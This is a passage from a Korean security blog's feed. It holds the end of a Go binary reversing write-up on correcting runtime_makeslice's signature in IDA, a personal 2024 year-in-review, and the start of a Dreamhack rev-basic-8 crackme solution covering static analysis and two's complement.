    &lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F580&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;r14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;10h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F584&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;jbe&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;loc_75F686&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58A&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58B&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F58E&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F592&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rbx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F597&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F59C&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rbx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F59F&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;qword&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_78A840&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000075&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F5A6&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;runtime_makeslice&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main_WDcode&lt;/code&gt;는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int64&lt;/code&gt; 타입 param을 2개 받고, 스택 내부 공간 할당 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub rsp, 18h&lt;/code&gt;를 통해 18h만큼의 공간을 할당받음&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;문제의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makeslice&lt;/code&gt; 함수가 실행 초반에 어떻게 파라미터를 처리하는지 확인하면 다음과 같음&lt;/p&gt;

    &lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAE0&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;r14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;10h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAE4&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;jbe&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;loc_46FB7F&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEA&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEB&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAEE&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;sub&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF2&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF5&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAF8&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;
 &lt;span class=&quot;nl&quot;&gt;.text:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;000000000046&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FAFB&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makeslice&lt;/code&gt; 함수는 스택 내부 공간 할당 시 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub rsp, 18h&lt;/code&gt;를 통해 18h만큼의 공간을 할당받으며, 이후 이어지는 스택 공간 관련 연산이 없음&lt;/li&gt;
      &lt;li&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime_makelice&lt;/code&gt; 또한 int64 타입 param을 2개 받으리란 추측이 가능함&lt;/li&gt;
      &lt;li&gt;따라서 해당 함수 type declaration을 통해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__int64 __fastcall runtime_makeslice(__int64, __int64);&lt;/code&gt; 로 재선언 진행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;그 결과, 아래와 같이 함수 재조정이 올바르게 되어 디컴파일이 가능해짐&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%2016.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:result_passing&quot;&gt;
      &lt;p&gt;Function calls pass arguments and results using a combination of the stack and machine registers. Each argument or result is passed either entirely in registers or entirely on the stack. Because access to registers is generally faster than access to the stack, arguments and results are preferentially passed in registers. However, any argument or result that contains a non-trivial array or does not fit entirely in the remaining available registers is passed on the stack. &lt;a href=&quot;#fnref:result_passing&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 24 Dec 2024 09:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-25-fsi-fiesta2024-S2-1</guid>
      </item>
    
      <item>
        <title>2024년 회고</title>
        <description>&lt;p&gt;블로그 포스트가 뜸했다&lt;/p&gt;

&lt;p&gt;사실 그게 말이지&lt;/p&gt;

&lt;p&gt;한 건 많거든요&lt;/p&gt;

&lt;p&gt;많은데&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;외부에 말할 수 없음&lt;/li&gt;
  &lt;li&gt;개인적으로 공부한 건 왜인진 모르겠지만 글을 쓰다가 안 썼음&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;근데 진짜 웃긴 건&lt;/p&gt;

&lt;p&gt;개인적으로 풀었으나 글을 쓰다가 만 건 또 찾아보면 다 풀어서 플래그까지 땄음&lt;/p&gt;

&lt;p&gt;그냥 귀찮아서 중간에 안 쓴 거임&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;금융보안원 SW공급망보안팀에 들어와서 정말 많은 걸 했고 배웠다&lt;/p&gt;

&lt;p&gt;그리고 정말 좋은 사람들을 많이 만났고&lt;/p&gt;

&lt;p&gt;내 롤모델로 삼은 사람도 만났다&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;올해 업무적으로는 크게 4개 정도 한 것 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;금융권 SW공급망보안 자율점검 체크리스트 개발&lt;/li&gt;
  &lt;li&gt;금융권 버그바운티 운영(아 진짜 재밌었다. 취약점 재현도 마음껏 하고 궁금한 게 있으면 물어볼 사람도 있고)&lt;/li&gt;
  &lt;li&gt;금융권 CNA 운영&lt;/li&gt;
  &lt;li&gt;원내 해킹 동아리 구성 및 운영&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 천천히 포스트에 추가하는 걸로 하자… 물론 언제 추가할진 모름&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;개인적으로는&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;책장에 구겨놨던 책들을 천천히 읽고 있다&lt;/li&gt;
  &lt;li&gt;하고 싶었던 공부를 마음껏 하고 있다&lt;/li&gt;
  &lt;li&gt;대학원에 지원했다&lt;/li&gt;
  &lt;li&gt;업무를 효율적으로 한다는 것은 무엇인지에 관해 계속 고민 중이다&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;적독-해소-중&quot;&gt;적독 해소 중&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 책을 많이 읽긴 한다&lt;/p&gt;

&lt;p&gt;학부생 시절엔 한 학기 동안 책 400권씩 읽고 그랬다 물론 휴학했던 때긴 함&lt;/p&gt;

&lt;p&gt;근데 작년에 취준을 하는 바람에….!!!!!! 직전에 잔뜩 사 놨던 책을 전혀 읽지 못했다&lt;/p&gt;

&lt;p&gt;영혼을 위한 닭고기수프를 못 먹은 지 근 1 여 년…. 내 영혼은 그만 배고파 돌아버리고 만다&lt;/p&gt;

&lt;p&gt;사실 본전 생각나서 돌아버렸다&lt;/p&gt;

&lt;p&gt;책장에 지금 새로 사 놓고 못 읽은 게 얼마 어치인데&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아무튼 그래서 열심히 읽고 있다. 와 근데 과거의 나… 보는 눈 굉장하다….&lt;/p&gt;

&lt;p&gt;책 설명만 읽고 구매~~~ 했던 건데 하나같이 수작임&lt;/p&gt;

&lt;p&gt;내 돈 들여 산 건데 갑자기 행운아가 된 것 같은 기분…&lt;/p&gt;

&lt;p&gt;이런 사소한 것에서 행복을 찾는 게 인생을 행복하게 사는 방법 아니겠나요?&lt;/p&gt;

&lt;p&gt;궤변을 이토록 논리적으로 하다니 과연 다독가구나.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;하고-싶었던-공부-중&quot;&gt;하고 싶었던 공부 중&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;사실 취준할 땐 논문을 읽으면서도 ‘이게… 취업에 도움이 될까…’ 이랬고&lt;/p&gt;

&lt;p&gt;해킹 문제를 풀면서도 ‘이게… 취업에 도움이 될까…’ 이랬음&lt;/p&gt;

&lt;p&gt;과연 이걸 해서 얻는 취업 관련 이득이 이걸로 인해 잃는 시간적 손실보다 큰가? 하면 당당히 YES라고 말할 수 없었음&lt;/p&gt;

&lt;p&gt;하지만 이제 취직했죠?&lt;/p&gt;

&lt;p&gt;내 실력이 얼마나 구리든 지금 이 논문이 어느 분야의 논문이든&lt;/p&gt;

&lt;p&gt;나에게는 주저하지 않을 자유가 주어졌음&lt;/p&gt;

&lt;p&gt;이게 얼마나 달콤한 맛인지 얻고 나니 알겠더라&lt;/p&gt;

&lt;p&gt;그래서 집에 가서 맨날 해킹 문제 풀고 프로그램 분석하고 심심하면 논문 뽑아 읽고 그랬음&lt;/p&gt;

&lt;p&gt;내가 초보라는 사실에 전혀 두려움을 느끼지 않았고 나에게 들어오는 정보 자체에 기뻐했음&lt;/p&gt;

&lt;p&gt;평생 이렇게 살고 싶다고 생각했음&lt;/p&gt;

&lt;p&gt;… 대학원을 지원하기 전까진 그랬음 (꼴랑 6개월 했단 뜻임)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;대학원-지원&quot;&gt;대학원 지원&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;내가 왜 이 짓을 했을까?&lt;/p&gt;

&lt;p&gt;아니 지원한 것 자체는 후회가 없다&lt;/p&gt;

&lt;p&gt;사유: 나는 학부 시절부터 진학을 하고 싶었음. 그러나 넓은 세상을 보고 싶은 욕구가 더 컸기 때문에 취업을 택했음&lt;/p&gt;

&lt;p&gt;이제 정말 원한다면 할 수 있는 때가 됐음&lt;/p&gt;

&lt;p&gt;그래서 지원함!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;근데 지원한다고 끝나는 게 아니죠?&lt;/p&gt;

&lt;p&gt;나는 몰랐었다 대학원 지원하려면 연구계획서를 써야 한다는 사실을&lt;/p&gt;

&lt;p&gt;그리고 잊고 있었다 면접을 준비해야 한다는 사실을&lt;/p&gt;

&lt;p&gt;대학원 준비하면서 제일 많이 했던 말: 아니 난 취업을 했는데 왜 자소서랑 이력서를 다시 쓰고 있는 것 같지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;2군데 지원했는데 다 붙었음&lt;/p&gt;

&lt;p&gt;와진짜감사합니다&lt;/p&gt;

&lt;p&gt;이런저라도…받아주시겠어요? 막이래&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;업무-효율화&quot;&gt;업무 효율화&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이건 요즘 꽂힌 주제다.&lt;/p&gt;

&lt;p&gt;어떻게 해야 디테일을 더 안 놓칠 수 있을까&lt;/p&gt;

&lt;p&gt;어떻게 해야 내가 이 사업을 가장 잘 아는 사람이 될 수 있을까&lt;/p&gt;

&lt;p&gt;그리고 업무 관련 이슈트래킹은 어떤 식으로 해놔야 히스토리를 압축하여 기억해둘 수 있을까&lt;/p&gt;

&lt;p&gt;아 괴롭다&lt;/p&gt;

&lt;p&gt;근데 의미없는 괴로움은 아니라 기껍다&lt;/p&gt;

&lt;p&gt;아무튼 그렇다… 그렇게 살고 있다&lt;/p&gt;

&lt;p&gt;블로그 포스트 더 자주 쓸 수 있도록 노력해야지&lt;/p&gt;

</description>
        <pubDate>Sun, 01 Dec 2024 07:24:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/Diary/241201</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/Diary/241201</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-8 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-확인&quot; id=&quot;markdown-toc-0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000&quot; id=&quot;markdown-toc-21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-2s-complement&quot; id=&quot;markdown-toc-22-2s-complement&quot;&gt;2.2. 2’s complement&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-sub_140001000-내부-비교-루틴어셈블리&quot; id=&quot;markdown-toc-23-sub_140001000-내부-비교-루틴어셈블리&quot;&gt;2.3. sub_140001000 내부 비교 루틴(어셈블리)&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-난관에-봉착하다&quot; id=&quot;markdown-toc-23-난관에-봉착하다&quot;&gt;2.3. 난관에 봉착하다&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-난관에서-빠져나왔다&quot; id=&quot;markdown-toc-24-난관에서-빠져나왔다&quot;&gt;2.4. 난관에서 빠져나왔다&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-질문&quot; id=&quot;markdown-toc-3-질문&quot;&gt;3. 질문.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0-메타데이터-확인&quot;&gt;0. 메타데이터 확인&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;PE64, C언어로 작성된 프로그램&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Input 나오고, 사용자 입력 받고, Correct / Wrong 판별해 보여줌&lt;/p&gt;

&lt;p&gt;콘솔에서 stdin 받음&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;역시나 똑같음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_1.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_1.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이제 sub_140001000을 들여다보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;21-sub_140001000&quot;&gt;2.1. sub_140001000&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_2.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_2.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;안예뻐&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_3.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-8/Untitled_3.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이젠예뻐&lt;/p&gt;

&lt;p&gt;byte_140003000 안에 담긴 데이터는 아래와 같음&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C6&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;궁금한 점. 왜 -5를 곱한 걸까? 이 문제의 의도가 뭘까?&lt;/p&gt;

&lt;p&gt;1byte 자료형이 마이너스를 표현하는 방법에 대해 알아보라는 뜻 아닐까?&lt;/p&gt;

&lt;p&gt;흠… 진짜 왜지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;22-2s-complement&quot;&gt;2.2. 2’s complement&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이진수의 모든 자리 숫자를 반전시키고, 1을 더해서 2의 보수를 구한다.&lt;/p&gt;

&lt;p&gt;2의 보수인 수는 원래 숫자의 음수로 취급된다.&lt;/p&gt;

&lt;p&gt;(자세한 건 생략)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-sub_140001000-내부-비교-루틴어셈블리&quot;&gt;2.3. sub_140001000 내부 비교 루틴(어셈블리)&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span 